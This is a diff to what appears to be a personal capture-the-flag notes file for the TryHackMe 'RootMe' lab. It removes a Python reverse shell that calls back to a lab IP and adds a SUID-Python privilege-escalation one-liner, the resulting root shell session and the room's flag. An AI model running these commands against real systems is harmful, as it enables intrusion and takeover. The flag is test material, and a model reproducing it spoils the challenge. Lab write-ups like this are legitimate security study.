@@ -236,8 +236,48 @@ find / -perm -4000 -type f 2>/dev/null
 > SUID bit binary set for Python so it can be run as root with python scripts for PE righttt???
 
 ```
-python -c 'import sys,socket,os,pty;s=socket.socket()
-s.connect(("10.64.92.225",5555))
-[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
-pty.spawn("/bin/sh")'
+www-data@ip-10-64-146-97:/$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
+root@ip-10-64-146-97:/# whoami 
+whoami
+root
+```
+![](Obsidian%20assets/RootMeimin.png)
+
+```
+root@ip-10-64-146-97:/# ls
+ls
+bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
+root@ip-10-64-146-97:/# cd ro	
+cd root/
+root@ip-10-64-146-97:/root# ls
+ls
+root.txt  snap
+root@ip-10-64-146-97:/root# cd sn	
+cd snap/
+root@ip-10-64-146-97:/root/snap# ls
+ls
+lxd
+root@ip-10-64-146-97:/root/snap# cd lxd
+cd lxd
+root@ip-10-64-146-97:/root/snap/lxd# ls
+ls
+32662  common  current
+root@ip-10-64-146-97:/root/snap/lxd# cd ..
+cd ..
+root@ip-10-64-146-97:/root/snap# cd ..
+cd ..
+root@ip-10-64-146-97:/root# ls
+ls
+root.txt  snap
+root@ip-10-64-146-97:/root# cat root
+cat root
+cat: root: No such file or directory
+root@ip-10-64-146-97:/root# cat ro	
+cat root.txt 
+THM{pr1v1l3g3_3sc4l4t10n}
+root@ip-10-64-146-97:/root# 
+
 ```
